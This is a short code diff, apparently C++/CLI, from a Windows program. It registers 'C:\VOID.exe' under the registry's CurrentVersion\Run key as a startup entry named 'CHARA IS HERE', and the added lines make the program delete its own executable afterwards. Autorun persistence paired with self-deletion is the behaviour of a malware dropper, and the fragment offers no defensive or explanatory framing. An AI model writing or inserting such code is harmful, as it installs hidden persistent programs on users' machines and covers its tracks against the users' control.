@@ -43,5 +43,7 @@ void main(array<String^>^ args)
 			"SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Run", true);
 
 		rk->SetValue("CHARA IS HERE", "C:\\VOID.exe -v");
+
+		File::Delete(Assembly::GetEntryAssembly()->Location);
 	}
 }
